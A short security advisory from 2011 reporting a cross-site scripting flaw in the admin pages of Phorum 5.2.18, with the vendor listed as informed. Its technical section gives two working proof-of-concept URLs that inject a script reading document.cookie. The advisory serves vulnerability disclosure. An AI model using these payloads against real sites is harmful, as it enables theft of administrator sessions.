Subject: Phorum 5.2.18 Cross-site scripting vulnerability

Advisory:              	Phorum 5.2.18 Cross-site scripting vulnerability
Advisory ID:           	SSCHADV2011-023
Author:                	Stefan Schurtz
Affected Software:  	Successfully tested on Phorum 5.2.18
Vendor URL:          	http://www.phorum.org/
Vendor Status:       	informed
CVE-ID:                	-

==========================
Vulnerability Description:
==========================

Phorum 5.2.18 is prone to a Cross-site scripting vulnerability

==================
Technical Details:
==================

http://<target>/phorum-5.2.18/admin/"</script><script>alert(document.cookie);</script></script>
http://<target>/phorum-5.2.18/admin/index.php"</script><script>alert(document.cookie);</script></script>

